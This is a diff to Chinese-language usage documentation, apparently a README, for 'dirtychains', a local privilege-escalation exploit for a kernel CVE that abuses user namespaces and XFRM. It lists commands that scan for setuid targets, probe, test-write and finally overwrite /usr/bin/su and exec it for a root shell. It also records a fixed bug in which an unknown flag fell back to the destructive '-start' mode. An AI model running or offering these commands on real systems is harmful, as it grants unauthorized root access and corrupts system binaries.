@@ -56,10 +56,15 @@ GUI 里按这个映射显示结论，不要按「0 就是成功」去读。
 4 字节，192 字节载荷要装 48 个 SA、发 48 次包，全程约 8 秒。
 
 ```bash
+./dirtychains --cve43503 -find                    # 只列 setuid 候选靶子，纯只读
 ./dirtychains --cve43503 -check -t /usr/bin/su    # 只探测 userns + XFRM，不写文件
 ./dirtychains --cve43503 -test  -t /usr/bin/su    # 写完回读校验，不 exec 目标
 ./dirtychains --cve43503 -start -t /usr/bin/su    # 成功后 exec 目标 → root shell
 ```
+
+四个模式必须显式指定。早期版本没实现 `-find`，未知开关会被静默忽略、退回默认的
+`-start` —— 界面上点「扫描 setuid」会直接开始改写目标并 exec 它。现在
+`-find` 已在三个引擎里都接上，且任何未知参数一律报错退出（`2`），不再猜。
 
 目标必须是普通文件、>= 4096 字节、且对当前用户不可写，否则直接以 `2` / `4` 退出——
 root 跑会被 gate 挡住，避免把系统文件打成后门。退出码和主引擎一致：
